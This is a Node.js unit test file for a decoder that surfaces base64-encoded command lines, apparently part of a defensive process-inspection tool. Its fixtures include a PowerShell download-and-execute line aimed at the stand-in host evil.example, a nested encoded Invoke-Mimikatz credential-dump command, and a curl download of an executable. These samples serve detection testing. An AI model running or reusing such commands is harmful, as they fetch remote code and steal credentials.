// Unit tests for src/utils/cmdline-decode.js (command-line base64 decoder).
// Loads the ESM module into a vm context with the regex-strip trick used by
// process-inspector.test.js. atob/TextDecoder are Node globals (not ECMAScript
// intrinsics) so they are injected into the sandbox explicitly.

const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");

function stripModuleSyntax(src) {
  return src
    .replace(/^\s*import\s+\{[^}]*\}\s*from\s*["'][^"']+["']\s*;?\s*$/gm, "")
    .replace(/^\s*import\s+[\w*\s,{}]+\s+from\s*["'][^"']+["']\s*;?\s*$/gm, "")
    .replace(/^export\s+const\s+/gm, "const ")
    .replace(/^export\s+let\s+/gm, "let ")
    .replace(/^export\s+function\s+/gm, "function ")
    .replace(/^export\s+default\s+/gm, "");
}

function load() {
  const src = fs.readFileSync(path.join(__dirname, "..", "src/utils/cmdline-decode.js"), "utf8");
  const ctx = { atob, TextDecoder };
  vm.createContext(ctx);
  vm.runInContext(
    stripModuleSyntax(src) + "\n;Object.assign(globalThis, { analyzeCommandLine, tokenizeCommandLine });",
    ctx,
  );
  return ctx;
}

const { analyzeCommandLine, tokenizeCommandLine } = load();
const enc16 = (s) => Buffer.from(s, "utf16le").toString("base64");
const enc8 = (s) => Buffer.from(s, "utf8").toString("base64");

test("decodes a PowerShell -EncodedCommand (UTF-16LE) payload", () => {
  const payload = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')";
  const cmd = `powershell.exe -nop -w hidden -enc ${enc16(payload)}`;
  const r = analyzeCommandLine(cmd);
  assert.equal(r.hasEncoded, true);
  assert.equal(r.decodings[0].source, "PowerShell -EncodedCommand");
  assert.equal(r.decodings[0].encoding, "utf-16le");
  assert.match(r.decodings[0].decoded, /DownloadString\('http:\/\/evil\.example\/a\.ps1'\)/);
});

test("matches both -enc and -EncodedCommand spellings", () => {
  const payload = "Write-Host hello-world";
  for (const flag of ["-enc", "-EncodedCommand", "-e", "/enc"]) {
    const r = analyzeCommandLine(`pwsh ${flag} ${enc16(payload)}`);
    assert.equal(r.hasEncoded, true, `flag ${flag} should decode`);
    assert.match(r.decodings[0].decoded, /hello-world/);
  }
});

test("recurses into nested base64 (enc → FromBase64String layer)", () => {
  const inner = "Invoke-Mimikatz -DumpCreds";
  const innerB64 = enc8(inner); // long enough to be a standalone blob
  const outer = `$x=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${innerB64}'));IEX $x`;
  const cmd = `powershell -enc ${enc16(outer)}`;
  const r = analyzeCommandLine(cmd);
  // layer 0: the -enc; deeper: the inner FromBase64String blob.
  assert.equal(r.decodings[0].source, "PowerShell -EncodedCommand");
  const nested = r.decodings.find((d) => /Invoke-Mimikatz/.test(d.decoded || ""));
  assert.ok(nested, "must surface the inner FromBase64String payload");
});

test("flags gzip-compressed base64 instead of emitting garbage", () => {
  const gz = Buffer.concat([Buffer.from([0x1f, 0x8b, 0x08, 0x00]), Buffer.alloc(40, 0x41)]).toString("base64");
  const r = analyzeCommandLine(`certutil -decode foo ${gz}`);
  const g = r.decodings.find((d) => d.encoding === "gzip");
  assert.ok(g, "gzip stream must be flagged");
  assert.equal(g.decoded, null);
  assert.match(g.note, /gzip/i);
});

test("does not decode a benign command with no base64", () => {
  const r = analyzeCommandLine("net use Z: \\\\fileserver\\share /user:corp\\alice");
  assert.equal(r.hasEncoded, false);
  assert.equal(r.decodings.length, 0);
});

test("rejects base64 that decodes to binary (no false hits on random blobs)", () => {
  const binary = Buffer.from(Array.from({ length: 48 }, (_, i) => (i * 7 + 3) % 256)).toString("base64");
  const r = analyzeCommandLine(`tool --data ${binary}`);
  assert.equal(r.decodings.some((d) => d.encoding !== "gzip" && d.decoded), false,
    "non-text binary base64 must not be surfaced as cleartext");
});

test("tokenizeCommandLine classifies urls, ips, flags and paths", () => {
  const segs = tokenizeCommandLine("curl -o C:\\Temp\\x.exe http://10.0.0.5/x.exe --silent");
  const byType = (t) => segs.filter((s) => s.type === t).map((s) => s.text.trim());
  assert.ok(byType("url").some((u) => u.includes("http://10.0.0.5/x.exe")));
  assert.ok(byType("path").some((p) => p.includes("C:\\Temp\\x.exe")));
  assert.ok(byType("flag").length >= 2, "‑o and ‑‑silent are flags");
});
